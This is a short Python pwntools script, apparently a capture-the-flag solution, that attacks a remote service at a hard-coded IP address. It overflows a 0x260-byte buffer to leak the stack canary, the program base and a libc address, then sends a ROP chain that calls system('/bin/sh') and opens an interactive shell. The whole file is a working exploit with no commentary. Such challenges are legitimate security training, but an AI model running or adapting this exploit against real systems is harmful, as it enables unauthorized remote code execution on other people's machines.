from pwn import *

p = remote("114.116.54.89", 10000)

val_add = 0xd2e
pop_rdi_add = 0xe03
puts_plt_add = 0x8b0
puts_got_add = 0x202018
start_add = 0xd20

print p.recvuntil("path:")
p.sendline("flag")
print p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260-8)+"B"
p.send(payload)
print p.recvuntil("B")
canary = u64(p.recv(7).rjust(8,"\x00"))
print "cancay:", hex(canary)
x = p.recvline()

p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)
payload += p64(0)
payload += "\x20"
p.send(payload)

print p.recvuntil("path:")
p.sendline("flag")
print p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260+7)+"B"
p.send(payload)
print p.recvuntil("B")
x = p.recvline()
val = u64(x[:-1].ljust(8,"\x00"))
print "val:", hex(val)
elf_base = val - val_add
print hex(elf_base)
p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)
payload += p64(0)
payload += "\x20"
p.send(payload)

puts_plt = elf_base + puts_plt_add
puts_got = elf_base + puts_got_add
pop_rdi = elf_base + pop_rdi_add
start = elf_base + start_add

p.recvuntil("path:")
p.sendline("flag")
p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260 + 8*5-1)+"B" 
p.send(payload)
p.recvuntil("B")
x = p.recvuntil("please")
print x
start_abs = u64(x[:8].split("\n")[0].ljust(8,"\x00"))
libc_base = start_abs - 0x20830
print hex(start_abs)
p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)
payload += p64(0)
payload += p64(start)
p.send(payload)

bin_add = 0x18cd57
sys_add = 0x45390

bin_abs = libc_base + bin_add
sys_abs = libc_base + sys_add

p.recvuntil("path:")
p.sendline("flag")
p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260-8)
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(bin_abs)
payload += p64(sys_abs)
payload += p64(start)

p.send(payload)
p.recv()
p.recvuntil("(len is 624)\n")
payload = "A"
p.send(payload)
p.interactive()

